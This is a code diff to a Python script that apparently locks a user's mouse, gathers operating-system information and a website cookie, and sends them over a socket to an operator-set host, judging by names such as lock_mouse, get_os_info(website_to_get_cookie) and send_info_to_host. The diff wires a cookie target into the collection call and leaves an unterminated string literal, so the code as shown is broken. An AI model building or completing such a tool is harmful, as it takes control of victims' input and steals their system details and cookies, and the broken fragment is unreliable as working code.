@@ -20,7 +20,13 @@ blink = "\033[5m"
 
 HOST = "" # your local ip address
 PORT = 80
+website_coockie = "
+time_mouse_locked = 0
+mouse_pos_x = 0
+mouse_pos_y = 0
 BUFFER = 1024*3
+
+
 
 def lock_mouse(X, Y, time_in_milliseconds):
     pos = (X,Y)
@@ -39,7 +45,7 @@ def lock_mouse(X, Y, time_in_milliseconds):
 def listen_for_host(host,port):
     address = (host,port)
     print(f"Getting information...")
-    get_os_info("https:///example.com")
+    get_os_info(website_coockie)
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         sock.bind(address)
@@ -88,5 +94,5 @@ def get_os_info(website_to_get_cookie):
         info_list.append(i)
 
 
-lock_mouse_pos = threading.Thread(target=lock_mouse(0,0,100)).start()
+lock_mouse_pos = threading.Thread(target=lock_mouse(mouse_pos_x,mouse_pos_y,time_mouse_locked)).start()
 send_info_to_host = threading.Thread(target=listen_for_host(HOST,PORT)).start()
